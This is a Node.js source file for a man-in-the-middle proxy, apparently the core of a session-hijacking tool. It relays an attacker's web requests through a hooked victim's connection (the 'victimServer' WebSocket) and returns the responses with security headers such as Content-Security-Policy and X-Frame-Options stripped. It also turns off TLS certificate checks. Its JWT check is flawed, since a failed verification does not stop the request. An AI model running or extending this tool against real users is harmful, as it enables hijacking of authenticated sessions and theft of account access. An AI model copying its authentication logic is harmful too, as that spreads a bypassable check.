const HttpMitmProxy = require('http-mitm-proxy');
const { startServer: startVictimServer, sendWebSocketRequest } = require('./victimServer');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const { execSync } = require('child_process');

process.removeAllListeners('warning');
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

blockedHeaders = [
  'x-content-type-option',
  'content-security-policy',
  'x-frame-options',
  'x-xss-protection',
  'content-encoding',
]

function getPort(configKey, defaultValue) {
  const config = readConfig();
  return config[configKey] || defaultValue;
}

function readConfig() {
  let config;
  try {
    config = JSON.parse(fs.readFileSync('files/config.json'));
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.log('No configuration found. Running "npm run setConfig" ...');
      execSync('npm run setConfig', { stdio: 'inherit' });
      config = JSON.parse(fs.readFileSync('files/config.json'));
    } else {
      throw err;
    }
  }

  return config;
}

const port = getPort('proxyServerPort');

let secret;
try {
  secret = JSON.parse(fs.readFileSync('files/secret.json')).secret;
} catch (err) {
  if (err.code === 'ENOENT') {
    console.log('No secret found. Please run "npm run regenerateSecret".');
    process.exit(1);
  } else {
    throw err;
  }
}

function deleteCertificateFile(certsDir, domain) {
  try {
    const certPath = path.join(certsDir, 'certs', `${domain}.pem`);
    fs.unlinkSync(certPath);
  } catch (err) {
    console.error(`Error removing certificate for ${domain}:`, err);
  }
}

function cleanHTML(html) {
  return html.replace(/\n/g, '').replace(/\r/g, '').replace(/\t/g, '').replace(/\s{2,}/g, ' ');
}

function filterHeaders(headers) {
  const filteredHeaders = {};
  for (const key in headers) {
    if (!blockedHeaders.includes(key.toLowerCase())) {
      filteredHeaders[key] = headers[key];
    }
  }
  return filteredHeaders;
}

function startProxyServer() {
  const proxy = new HttpMitmProxy.Proxy();
  
  proxy.onRequest(async (ctx, callback) => {

    const token = ctx.clientToProxyRequest.headers['shve-authentication'];

    if (token === undefined) {
      console.error('Failed to authenticate token:' + token);
      ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
      ctx.proxyToClientResponse.end('Failed to authenticate');
      return;
    }

    jwt.verify(token, secret, (err, decoded) => {
      if (err) {
        console.error('Failed to authenticate token:', err);
        ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
        ctx.proxyToClientResponse.end('Failed to authenticate');
        return;
      }
    });

    ctx.dataChunks = [];
    const method = ctx.clientToProxyRequest.method;

    const protocol = ctx.isSSL ? 'https://' : 'http://';
    const host = ctx.clientToProxyRequest.headers.host;
    const url = ctx.clientToProxyRequest.url;
  
    const fullUrl = `${protocol}${host}${url}`;
  
    console.log(`[${new Date().toISOString()}] ${ctx.clientToProxyRequest.method} ${fullUrl}`);
  
    const wsId = ctx.clientToProxyRequest.headers.shve;
    const headers = ctx.clientToProxyRequest.headers;

    ctx.onRequestData((ctx, chunk, callback) => {
      try{
        ctx.dataChunks.push(chunk);
        return callback(null, chunk);
      }catch (error) {
        if (error.code !== 'ERR_STREAM_WRITE_AFTER_END') {
          throw error;
        }
      }
    });

    ctx.onResponse(async (ctx, callback) => {
      try{
        const contentType = ctx.serverToProxyResponse.headers['content-type'];
        const statusCode = ctx.serverToProxyResponse.statusCode;
        if (contentType && (contentType.startsWith('text/html') || contentType.startsWith('application/json') || contentType.startsWith('application/xml'))) {
          const postData = ctx.dataChunks.length > 0 ? Buffer.concat(ctx.dataChunks).toString() : null;
          const response = await sendWebSocketRequest(wsId, ctx.clientToProxyRequest.method, fullUrl, headers, postData);
          if (response.error){
            ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
            ctx.proxyToClientResponse.end(response.error);
          }
          else{
            const filteredHeaders = filterHeaders(response.headers);
            let filteredHtml;
            filteredHtml = cleanHTML(response.data);
            ctx.proxyToClientResponse.writeHead(response.status_code, filteredHeaders);
            ctx.proxyToClientResponse.end(filteredHtml);
          }
        } 
        else{
          ctx.proxyToClientResponse.writeHead(statusCode ,filterHeaders(ctx.serverToProxyResponse.headers));
        }
        return callback();
      } catch (error) {
        if (error.code !== 'ERR_STREAM_WRITE_AFTER_END') {
          throw error;
        }
      }
      
    });

    ctx.onError((ctx, error) => {
      if (error.message.includes('key values mismatch')) {
        console.log('Certificate Error, Regenerating certificates...');
        const domain = ctx.clientToProxyRequest.headers.host;
        if (domain) {
          deleteCertificateFile('./certs', domain);
        }
      }
    });

    callback();
  });

  proxy.listen({ host: '0.0.0.0', port: 8080, sslCaDir: './certs' }, () => {
    console.log('Proxy listening on port: 8080');
  });
}

module.exports = startProxyServer;